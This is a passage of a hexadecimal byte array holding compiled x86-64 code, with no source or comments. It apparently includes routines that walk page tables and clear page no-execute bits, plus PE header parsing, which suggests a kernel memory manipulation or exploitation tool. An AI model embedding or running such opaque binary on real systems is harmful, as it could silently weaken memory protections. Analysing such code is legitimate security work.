    0x89, 0xEA, 0x49, 0x89, 0xD8, 0x45, 0x89, 0xE9, 0xFF, 0x15, 0x5A, 0x73, 0x00, 0x00, 0x4D, 0x85,
    0xF6, 0x74, 0x38, 0x44, 0x89, 0xF0, 0xF7, 0xD8, 0x44, 0x0F, 0xB7, 0xE8, 0x4D, 0x01, 0xF5, 0x4D,
    0x89, 0xE6, 0x4D, 0x29, 0xEE, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x3F, 0x37, 0x00,
    0x00, 0x48, 0x89, 0xEA, 0x49, 0x89, 0xD8, 0x4D, 0x89, 0xE9, 0xFF, 0x15, 0x28, 0x73, 0x00, 0x00,
    0x4C, 0x3B, 0x74, 0x24, 0x48, 0x0F, 0x83, 0x99, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xB4, 0x24, 0x90,
    0x00, 0x00, 0x00, 0x4D, 0x01, 0xE6, 0x48, 0x8D, 0x0D, 0xFD, 0x30, 0x00, 0x00, 0x48, 0x89, 0xEA,
    0x49, 0x89, 0xD8, 0x4D, 0x89, 0xF1, 0xFF, 0x15, 0xFC, 0x72, 0x00, 0x00, 0xE9, 0x32, 0xFF, 0xFF,
    0xFF, 0x48, 0x8D, 0x0D, 0x77, 0x4F, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x2D, 0x41, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x06, 0x5E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x98, 0x43, 0x00, 0x00, 0xFF,
    0x15, 0xD3, 0x72, 0x00, 0x00, 0x45, 0x31, 0xED, 0x4D, 0x85, 0xF6, 0x74, 0x30, 0x4C, 0x89, 0x74,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0xAA, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE9, 0x5D, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x94, 0x4E, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0xBF, 0x5D, 0x00, 0x00, 0xFF, 0x15,
    0xA4, 0x72, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xFF, 0x15, 0xB3, 0x71, 0x00, 0x00, 0x4C, 0x89, 0xE8,
    0x48, 0x81, 0xC4, 0x48, 0x04, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41,
    0x5E, 0x41, 0x5F, 0xC3, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xBB, 0x31, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x8F, 0x5D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x29, 0x43, 0x00, 0x00, 0x4D, 0x89,
    0xE9, 0xFF, 0x15, 0x61, 0x72, 0x00, 0x00, 0x4D, 0x85, 0xED, 0x74, 0x52, 0x48, 0x8D, 0x0D, 0xFC,
    0x35, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x7A, 0x5D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x06, 0x43, 0x00,
    0x00, 0x4D, 0x89, 0xE9, 0xFF, 0x15, 0x3E, 0x72, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x4C,
    0x89, 0xEA, 0x49, 0x89, 0xF8, 0x45, 0x31, 0xC9, 0xE8, 0x03, 0xEE, 0xFF, 0xFF, 0x85, 0xC0, 0x79,
    0x3E, 0x48, 0x8D, 0x0D, 0x7A, 0x43, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x3F, 0x5D, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0xD1, 0x42, 0x00, 0x00, 0xFF, 0x15, 0x0C, 0x72, 0x00, 0x00, 0xEB, 0x1E, 0x48, 0x8D,
    0x0D, 0xDB, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x22, 0x5D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB4,
    0x42, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0xEC, 0x71, 0x00, 0x00, 0x45, 0x31, 0xED, 0x4C,
    0x8B, 0x74, 0x24, 0x38, 0x4D, 0x85, 0xF6, 0x0F, 0x85, 0x10, 0xFF, 0xFF, 0xFF, 0xE9, 0x3B, 0xFF,
    0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x58, 0x44, 0x89, 0xCF, 0x31,
    0xC0, 0x41, 0x83, 0xF9, 0x01, 0xB9, 0xFF, 0xFF, 0x1F, 0x00, 0x41, 0xB9, 0xFF, 0x0F, 0x00, 0x00,
    0x4C, 0x0F, 0x44, 0xC9, 0x0F, 0x94, 0xC0, 0x83, 0xFF, 0x02, 0xBB, 0xFF, 0xFF, 0xFF, 0x3F, 0x49,
    0x0F, 0x45, 0xD9, 0x8D, 0x44, 0xC0, 0x0C, 0x49, 0x89, 0xD9, 0x49, 0xF7, 0xD1, 0xB9, 0x1E, 0x00,
    0x00, 0x00, 0x0F, 0x45, 0xC8, 0x4C, 0x01, 0xC3, 0x4C, 0x21, 0xCB, 0x48, 0xD3, 0xEB, 0x89, 0xD5,
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x41, 0x89, 0xD6, 0x48, 0x8D, 0x54, 0x24,
    0x30, 0x4C, 0x89, 0xF1, 0xFF, 0x15, 0x26, 0x70, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x23, 0x48, 0x8D,
    0x0D, 0xE8, 0x3F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x72, 0x5C, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x5C,
    0x52, 0x00, 0x00, 0xFF, 0x15, 0x3F, 0x71, 0x00, 0x00, 0x45, 0x31, 0xF6, 0xE9, 0x2A, 0x02, 0x00,
    0x00, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x85, 0xF6, 0x74, 0x2E, 0x48, 0x89, 0x74, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x42, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4B, 0x5C, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0xF7, 0x4C, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x21, 0x5C, 0x00, 0x00, 0xFF, 0x15, 0x06, 0x71,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xEB, 0x02, 0x31, 0xC9, 0x89, 0xEA, 0xE8, 0xBE, 0x18,
    0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0xA9, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x89,
    0xEA, 0xE8, 0x2A, 0x19, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x95, 0x01, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0xE8, 0x08, 0x0F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x15, 0x01, 0x00,
    0x00, 0x49, 0x89, 0xC7, 0x48, 0x89, 0xC1, 0xE8, 0x14, 0x18, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84,
    0x1F, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0xAC, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24,
    0x3C, 0x4C, 0x8D, 0x44, 0x24, 0x38, 0x4C, 0x8D, 0x4C, 0x24, 0x40, 0x89, 0xE9, 0xE8, 0x7E, 0x09,
    0x00, 0x00, 0x8B, 0x54, 0x24, 0x38, 0x8B, 0x4C, 0x24, 0x3C, 0x4C, 0x8D, 0x05, 0x6C, 0x5E, 0x00,
    0x00, 0xE8, 0x5A, 0x19, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x2B, 0x01, 0x00, 0x00, 0x4C, 0x33,
    0x74, 0x24, 0x30, 0x44, 0x8B, 0x4C, 0x24, 0x38, 0x44, 0x8B, 0x44, 0x24, 0x3C, 0x4C, 0x89, 0x74,
    0x24, 0x20, 0x48, 0x8D, 0x4C, 0x24, 0x4C, 0x4C, 0x89, 0xFA, 0xE8, 0x61, 0x07, 0x00, 0x00, 0x80,
    0x7C, 0x24, 0x54, 0x00, 0x0F, 0x84, 0x51, 0x01, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x4C, 0x89, 0xEA,
    0x41, 0x89, 0xF8, 0xE8, 0x68, 0x09, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x83, 0xFF, 0x01, 0x48, 0x8D,
    0x05, 0x2C, 0x5C, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x29, 0x5C, 0x00, 0x00, 0x48, 0x0F, 0x44, 0xC8,
    0x83, 0xFF, 0x02, 0x48, 0x8D, 0x05, 0x1F, 0x5C, 0x00, 0x00, 0x48, 0x0F, 0x45, 0xC1, 0x48, 0x89,
    0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xB6, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x33, 0x5B, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x17, 0x51, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xFF, 0x15, 0xF7, 0x6F, 0x00,
    0x00, 0x4C, 0x89, 0xF9, 0x4C, 0x89, 0xF2, 0x49, 0x89, 0xD8, 0x41, 0x89, 0xF9, 0xE8, 0xBE, 0xEB,
    0xFF, 0xFF, 0x89, 0xC7, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0xA2, 0x18, 0x00, 0x00, 0x85, 0xFF,
    0x0F, 0x89, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xA6, 0x57, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xEA, 0x5A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD4, 0x50, 0x00, 0x00, 0x41, 0x89, 0xF9, 0xFF, 0x15,
    0xB4, 0x6F, 0x00, 0x00, 0xEB, 0x6D, 0x48, 0x8D, 0x0D, 0x32, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xCA, 0x5A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB4, 0x50, 0x00, 0x00, 0xFF, 0x15, 0x97, 0x6F, 0x00,
    0x00, 0xEB, 0x50, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x53, 0x18, 0x00, 0x00, 0x49, 0xC1, 0xEF,
    0x0C, 0x48, 0x8B, 0x05, 0x08, 0x6E, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x09, 0x6E, 0x00, 0x00, 0x48,
    0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x0B, 0x55, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x87, 0x5A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x71, 0x50, 0x00, 0x00, 0x4D, 0x89,
    0xF9, 0xFF, 0x15, 0x51, 0x6F, 0x00, 0x00, 0xEB, 0x0A, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x0D,
    0x18, 0x00, 0x00, 0x45, 0x31, 0xF6, 0x48, 0x85, 0xF6, 0x74, 0x30, 0x48, 0x89, 0x74, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x1C, 0x46, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5B, 0x5A, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x06, 0x4B, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x31, 0x5A, 0x00, 0x00, 0xFF, 0x15, 0x16, 0x6F,
    0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x25, 0x6E, 0x00, 0x00, 0x4C, 0x89, 0xF0, 0x48, 0x83,
    0xC4, 0x58, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x30,
    0xE8, 0xBB, 0x17, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8D, 0x0D, 0xC1, 0x4F, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x06, 0x5A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF0, 0x4F, 0x00, 0x00, 0xEB,
    0x80, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xB1, 0x01, 0xB2, 0x01, 0xFF, 0x15, 0x52, 0x6C, 0x00, 0x00, 0xFF, 0x15,
    0x54, 0x6C, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xFF, 0x25, 0xA8, 0x6C, 0x00, 0x00,
    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x0F, 0xAE, 0xF0, 0xB1, 0x01, 0xB2, 0x01, 0xFF,
    0x15, 0x2B, 0x6C, 0x00, 0x00, 0xFF, 0x15, 0x2D, 0x6C, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x31, 0xD2,
    0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x0C, 0x6C, 0x00, 0x00, 0x0F, 0xAE, 0xF0, 0x48,
    0x83, 0xC4, 0x20, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0xFF, 0x15, 0x42, 0x6C, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x07, 0x48, 0x8B, 0x00, 0xA8, 0x01, 0x75, 0x04, 0x31, 0xF6, 0xEB, 0x16, 0x48, 0xB9,
    0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x81, 0xE6, 0xFF, 0x0F, 0x00,
    0x00, 0x48, 0x09, 0xC6, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x48,
    0x04, 0x00, 0x00, 0x4C, 0x89, 0xC6, 0x48, 0x89, 0xCF, 0x41, 0x89, 0xD5, 0x4C, 0x89, 0xEB, 0x4C,
    0x29, 0xC3, 0x45, 0x31, 0xC9, 0x4C, 0x8D, 0x35, 0x28, 0x59, 0x00, 0x00, 0x4C, 0x8D, 0x3D, 0xBD,
    0x4E, 0x00, 0x00, 0x31, 0xED, 0x45, 0x31, 0xE4, 0xEB, 0x15, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x41, 0xFF, 0xC4, 0x45, 0x89, 0xE1, 0x4C, 0x39, 0xCB, 0x0F, 0x82, 0x90, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xF6, 0x74, 0x1A, 0x4A, 0x8D, 0x04, 0x0F, 0x31, 0xC9, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x80, 0x3C, 0x08, 0x00, 0x75, 0xDA, 0x48, 0xFF, 0xC1, 0x48, 0x39, 0xCE, 0x75, 0xF2, 0x4D, 0x8D,
    0x24, 0x31, 0x4D, 0x39, 0xEC, 0x73, 0x29, 0x4C, 0x89, 0xE9, 0x4C, 0x29, 0xC9, 0x48, 0x89, 0xF0,
    0x42, 0x80, 0x3C, 0x27, 0x00, 0x75, 0x1C, 0x48, 0xFF, 0xC0, 0x49, 0xFF, 0xC4, 0x4D, 0x39, 0xEC,
    0x72, 0xEE, 0x48, 0x89, 0xC8, 0x4D, 0x89, 0xEC, 0xEB, 0x09, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x48, 0x89, 0xF0, 0x83, 0xFD, 0x7F, 0x77, 0x5A, 0x49, 0x01, 0xF9, 0x89, 0xE9, 0xFF, 0xC5, 0x4C,
    0x89, 0x4C, 0xCC, 0x40, 0x4A, 0x8D, 0x0C, 0x27, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x4C,
    0x24, 0x28, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x60, 0x60, 0x00, 0x00, 0x4C, 0x89,
    0xF2, 0x4D, 0x89, 0xF8, 0xFF, 0x15, 0x4E, 0x6D, 0x00, 0x00, 0xE9, 0x64, 0xFF, 0xFF, 0xFF, 0x85,
    0xED, 0x75, 0x3A, 0x48, 0x8D, 0x0D, 0x9C, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5D, 0x58, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0xF8, 0x4D, 0x00, 0x00, 0xFF, 0x15, 0x2A, 0x6D, 0x00, 0x00, 0x31, 0xF6,
    0xEB, 0x66, 0x48, 0x8D, 0x0D, 0xC2, 0x5C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x54, 0x58, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xD9, 0x4D, 0x00, 0x00, 0xFF, 0x15, 0x0B, 0x6D, 0x00, 0x00, 0x48, 0x8D, 0x4C,
    0x24, 0x38, 0xFF, 0x15, 0x58, 0x6C, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x89, 0xE9, 0x48,
    0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x74, 0x07, 0x48, 0x99, 0x48, 0xF7, 0xF9, 0xEB, 0x04, 0x31,
    0xD2, 0xF7, 0xF1, 0x89, 0xD0, 0x48, 0x8B, 0x74, 0xC4, 0x40, 0x48, 0x8D, 0x0D, 0xFF, 0x42, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xFC, 0x57, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x91, 0x4D, 0x00, 0x00, 0x49,
    0x89, 0xF1, 0xFF, 0x15, 0xC0, 0x6C, 0x00, 0x00, 0x48, 0x89, 0xF0, 0x48, 0x81, 0xC4, 0x48, 0x04,
    0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x63,
    0x61, 0x3C, 0x66, 0x42, 0x83, 0x7C, 0x21, 0x06, 0x00, 0x74, 0x46, 0x4C, 0x89, 0xCB, 0x4D, 0x89,
    0xC6, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x49, 0x01, 0xCC, 0x41, 0x0F, 0xB7, 0x44, 0x24, 0x14,
    0x4E, 0x8D, 0x3C, 0x20, 0x49, 0x83, 0xC7, 0x18, 0x31, 0xED, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x4C, 0x89, 0xF9, 0x4C, 0x89, 0xF2, 0x49, 0x89, 0xD8, 0xFF, 0x15, 0x79, 0x6C, 0x00, 0x00, 0x85,
    0xC0, 0x74, 0x12, 0xFF, 0xC5, 0x49, 0x83, 0xC7, 0x28, 0x66, 0x41, 0x3B, 0x6C, 0x24, 0x06, 0x72,
    0xDF, 0x31, 0xF6, 0xEB, 0x0D, 0x41, 0x8B, 0x47, 0x08, 0x89, 0x07, 0x41, 0x8B, 0x47, 0x0C, 0x48,
    0x01, 0xC6, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41,
    0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48,
    0x44, 0x89, 0xC5, 0x49, 0x89, 0xD6, 0x48, 0x89, 0xCE, 0xE8, 0x32, 0x15, 0x00, 0x00, 0x48, 0x89,
    0xC7, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48,
    0x21, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x43, 0x31, 0x00, 0x00, 0x4C, 0x8D,
    0x3D, 0xFF, 0x56, 0x00, 0x00, 0x4C, 0x8D, 0x25, 0x63, 0x49, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D,
    0x89, 0xE0, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0xBD, 0x6B, 0x00, 0x00, 0x49, 0x81, 0xC6, 0xFF, 0x0F,
    0x00, 0x00, 0x4C, 0x89, 0xF3, 0x48, 0xC1, 0xEB, 0x0C, 0x48, 0x8D, 0x0D, 0xD7, 0x34, 0x00, 0x00,
    0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE0, 0x49, 0x89, 0xD9, 0xFF, 0x15, 0x99, 0x6B, 0x00, 0x00, 0x49,
    0x81, 0xFE, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x82, 0x3D, 0x02, 0x00, 0x00, 0x48, 0xB8, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x49, 0xBE, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
    0x4C, 0x21, 0xF7, 0x48, 0xFF, 0xC0, 0x31, 0xD2, 0x40, 0x84, 0xED, 0xB9, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x4C, 0x24, 0x30, 0x48, 0x0F, 0x44, 0xC2, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xC1,
    0xE8, 0x3F, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0xFB, 0x01, 0x48, 0x83, 0xD3, 0x00, 0x4C,
    0x8D, 0x2D, 0x66, 0x32, 0x00, 0x00, 0x4C, 0x8D, 0x3D, 0x67, 0x56, 0x00, 0x00, 0x4C, 0x8D, 0x25,
    0xCB, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x2D, 0x53, 0x56, 0x00, 0x00, 0xEB, 0x3F, 0x0F, 0x1F, 0x00,
    0x48, 0x8D, 0x0D, 0x1E, 0x32, 0x00, 0x00, 0x48, 0x89, 0xEA, 0x4D, 0x89, 0xE0, 0x49, 0x89, 0xF1,
    0xFF, 0x15, 0x12, 0x6B, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xE1, 0x31, 0x00, 0x00, 0x48, 0x89, 0xEA,
    0x4D, 0x89, 0xE0, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xFC, 0x6A, 0x00, 0x00, 0x48, 0x81, 0xC6, 0x00,
    0x10, 0x00, 0x00, 0x48, 0xFF, 0xCB, 0x0F, 0x84, 0x96, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x4C,
    0x89, 0xFA, 0x4D, 0x89, 0xE0, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xDA, 0x6A, 0x00, 0x00, 0x48, 0x89,
    0xF9, 0xFF, 0x15, 0x19, 0x69, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0xC1, 0xE9, 0x24, 0x81, 0xE1,
    0xF8, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x08, 0xF6, 0xC1, 0x01, 0x74, 0x93, 0x4C, 0x21, 0xF1,
    0xFF, 0x15, 0xFA, 0x68, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0xC1, 0xE9, 0x1B, 0x81, 0xE1, 0xF8,
    0x0F, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x08, 0x89, 0xC8, 0x25, 0x81, 0x00, 0x00, 0x00, 0x83, 0xF8,
    0x01, 0x0F, 0x85, 0x69, 0xFF, 0xFF, 0xFF, 0x4C, 0x21, 0xF1, 0xFF, 0x15, 0xD0, 0x68, 0x00, 0x00,
    0x49, 0x89, 0xC5, 0x4C, 0x89, 0xF2, 0x41, 0x89, 0xF6, 0x41, 0xC1, 0xEE, 0x15, 0x41, 0x81, 0xE6,
    0xFF, 0x01, 0x00, 0x00, 0x4A, 0x8B, 0x0C, 0xF0, 0x89, 0xC8, 0x25, 0x81, 0x00, 0x00, 0x00, 0x83,
    0xF8, 0x01, 0x75, 0x30, 0x48, 0x21, 0xD1, 0xFF, 0x15, 0xA3, 0x68, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x74, 0x22, 0x89, 0xF1, 0xC1, 0xE9, 0x0C, 0x81, 0xE1, 0xFF, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x0C,
    0xC8, 0x41, 0xF6, 0xC1, 0x01, 0x0F, 0x85, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xE1, 0x30,
    0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x2A, 0x31, 0x00, 0x00, 0x48, 0x89, 0xEA, 0x4D, 0x89,
    0xE0, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x1E, 0x6A, 0x00, 0x00, 0x4F, 0x8B, 0x4C, 0xF5, 0x00, 0x44,
    0x89, 0xC8, 0xF7, 0xD0, 0xA8, 0x81, 0x75, 0x46, 0x4C, 0x89, 0xC8, 0x48, 0xB9, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x21, 0xC8, 0x48, 0x0B, 0x44, 0x24, 0x40, 0x4B, 0x89, 0x44,
    0xF5, 0x00, 0x41, 0xD1, 0xE9, 0x41, 0x83, 0xE1, 0x01, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x89, 0x44,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0xA5, 0x4E, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE0, 0xFF,
    0x15, 0xD3, 0x69, 0x00, 0x00, 0xB0, 0x01, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x16, 0x48, 0x8D,
    0x0D, 0x43, 0x30, 0x00, 0x00, 0x48, 0x89, 0xEA, 0x4D, 0x89, 0xE0, 0x49, 0x89, 0xF1, 0xFF, 0x15,
    0xB4, 0x69, 0x00, 0x00, 0x49, 0xBE, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x4C, 0x8D,
    0x2D, 0xC7, 0x30, 0x00, 0x00, 0xE9, 0xA2, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xCA, 0x49, 0xB8, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x4C, 0x21, 0xC2, 0x48, 0x0B, 0x54, 0x24, 0x40, 0x48,
    0x89, 0x14, 0xC8, 0x41, 0xD1, 0xE9, 0x41, 0x83, 0xE1, 0x01, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x89,
    0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x6D, 0x4E, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE0,
    0xFF, 0x15, 0x62, 0x69, 0x00, 0x00, 0xB0, 0x01, 0x48, 0x89, 0x44, 0x24, 0x30, 0xE9, 0x38, 0xFF,
    0xFF, 0xFF, 0xF6, 0x44, 0x24, 0x30, 0x01, 0x75, 0x1F, 0x48, 0x8D, 0x0D, 0x02, 0x3D, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x67, 0x54, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD1, 0x46, 0x00, 0x00, 0xFF, 0x15,
    0x34, 0x69, 0x00, 0x00, 0x31, 0xC0, 0xEB, 0x1D, 0x48, 0x8D, 0x0D, 0x09, 0x3D, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x4E, 0x54, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB2, 0x46, 0x00, 0x00, 0xFF, 0x15, 0x15,
    0x69, 0x00, 0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x48, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41,
    0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48,
    0x44, 0x89, 0xCB, 0x44, 0x89, 0xC7, 0x48, 0x89, 0xCE, 0xC7, 0x41, 0x08, 0x00, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00, 0x45, 0x39, 0xC8, 0x73, 0x66, 0x81, 0xFB, 0x01, 0x02,
